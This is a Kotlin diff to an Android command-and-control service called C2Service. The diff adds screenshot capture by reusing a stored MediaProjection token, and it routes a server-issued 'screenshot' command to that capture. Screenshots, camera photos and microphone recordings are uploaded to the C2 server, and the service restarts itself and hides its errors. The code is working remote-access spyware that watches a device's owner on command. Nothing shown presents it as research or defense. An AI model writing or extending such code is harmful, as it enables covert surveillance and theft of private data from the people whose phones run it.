@@ -3,6 +3,8 @@ package com.outcome.c2
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
@@ -25,13 +27,47 @@ class C2Service : Service() {
     private val deviceId: String by lazy { DeviceInfo.id(this) }
     private lateinit var serverUrl: String
 
+    // Live MediaProjection shared across screenshots
+    @Volatile private var projection: MediaProjection? = null
+
     override fun onCreate() {
         super.onCreate()
         startForeground(1, buildNotification())
         serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
             .getString("server_url", BuildConfig.C2_URL)!!
+        tryInitProjection()
         scope.launch { registerLoop() }
         scope.launch { pollLoop() }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Retry projection init whenever service is restarted
+        if (projection == null) tryInitProjection()
+        return START_STICKY
+    }
+
+    private fun tryInitProjection() {
+        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
+        val resultCode = prefs.getInt("proj_code", Int.MIN_VALUE)
+        val dataStr = prefs.getString("proj_data", null)
+        if (resultCode == Int.MIN_VALUE || dataStr == null) return
+
+        try {
+            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            val projData = Intent.parseUri(dataStr, 0)
+            val proj = mpm.getMediaProjection(resultCode, projData)
+            if (proj == null) return
+
+            proj.registerCallback(object : MediaProjection.Callback() {
+                override fun onStop() {
+                    projection = null
+                }
+            }, android.os.Handler(android.os.Looper.getMainLooper()))
+
+            projection = proj
+        } catch (_: Exception) {
+            projection = null
+        }
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -80,10 +116,18 @@ class C2Service : Service() {
         val type = cmd.getString("type")
         val args = cmd.optJSONObject("args") ?: JSONObject()
         val result = try {
-            CommandExecutor.run(this, type, args)
+            when (type) {
+                "screenshot" -> {
+                    val p = projection
+                    if (p == null) JSONObject().put("error", "projection_not_ready")
+                    else Screenshot.capture(this, p)
+                }
+                else -> CommandExecutor.run(this, type, args)
+            }
         } catch (e: Exception) {
             JSONObject().put("error", e.message ?: "unknown")
         }
+
         val payload = JSONObject()
             .put("command_id", id)
             .put("device_id", deviceId)
@@ -99,8 +143,13 @@ class C2Service : Service() {
                 "mic_record" -> "mic"
                 else -> "misc"
             }
+            val ext = when (type) {
+                "screenshot", "camera_photo" -> "jpg"
+                "mic_record" -> "m4a"
+                else -> "bin"
+            }
             try {
-                Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.jpg")
+                Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.$ext")
             } catch (_: Exception) {}
         }
     }
@@ -118,6 +167,8 @@ class C2Service : Service() {
         }
 
     override fun onDestroy() {
+        try { projection?.stop() } catch (_: Exception) {}
+        projection = null
         scope.cancel()
         super.onDestroy()
     }
